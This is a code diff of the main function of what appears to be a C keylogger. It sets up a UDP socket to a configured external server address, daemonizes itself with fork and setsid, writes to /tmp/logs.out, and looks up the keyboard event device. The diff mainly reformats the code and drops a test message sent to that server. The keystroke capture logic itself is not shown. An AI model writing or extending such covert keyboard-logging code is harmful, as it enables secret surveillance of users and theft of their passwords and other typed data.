@@ -16,29 +16,21 @@ int main()
 {
     FILE *file;
     char *keyboard_event_filename = NULL;
-    
+
     int socket_desc;
     struct sockaddr_in server_addr;
-    int server_struct_length = sizeof(server_addr);
-	
+
     socket_desc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    
-    if(socket_desc < 0){
-    	printf("error: could not create socket\n");
+
+    if (socket_desc < 0)
+    {
+        printf("error: could not create socket\n");
     }
-    
+
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(SERVER_PORT);
     server_addr.sin_addr.s_addr = inet_addr(SERVER_ADDR);
-    
-    char * message = "hello\n";    
-    
-    if(sendto(socket_desc, message, strlen(message), 0,
-         (struct sockaddr*)&server_addr, server_struct_length) < 0){
-        printf("error: unable to send message to external server\n");
-        return -1;
-    }
-    
+
     pid_t pid, sid;
     pid = fork();
 
@@ -55,7 +47,6 @@ int main()
     sid = setsid();
 
     file = fopen("/tmp/logs.out", "w");
-    
 
     keyboard_event_filename = find_keyboard(keyboard_event_filename);
 
